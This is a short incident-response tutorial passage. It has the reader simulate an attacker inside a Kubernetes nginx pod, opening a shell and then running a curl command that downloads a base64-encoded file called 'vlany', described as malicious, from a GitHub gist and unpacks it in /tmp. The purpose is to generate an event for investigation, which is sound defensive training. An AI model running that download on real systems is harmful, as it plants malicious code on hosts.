We will go now go through a incident response workflow and how you can investigate an event.

Let's use Helm to install a nginx container:

`helm repo add bitnami https://charts.bitnami.com
helm install --name example bitnami/nginx`

You can check that the container is running, and the name of the pod by running  
`kubectl get pod -l app=example-nginx`

Now let's play the attacker, and spawn a shell:  
`kubectl exec -it YOUR_POD_NAME -- /bin/bash`  
You can get the value of `YOUR_POD_NAME` from the previous command.

You will be presented with a command prompt similar to this:  
`I have no name!@example-nginx-769dfcf684-l4m67:/app$`

You can execute a few commands inside the container, or even download some malicious file.  
`cd /tmp &&
curl https://gist.githubusercontent.com/mateobur/d888e36de12f8fe42a18f54ce4b1fc7c/raw/dd0c4cb23db7cc17a2086c5dee9338522fb8ae69/vlany | base64 -d > vlany-master.tar.gz &&
tar zxvf vlany-master.tar.gz`

Remember that the capture was configured to go on for 20 seconds after the event, so
make sure to do execute your commands within that time.
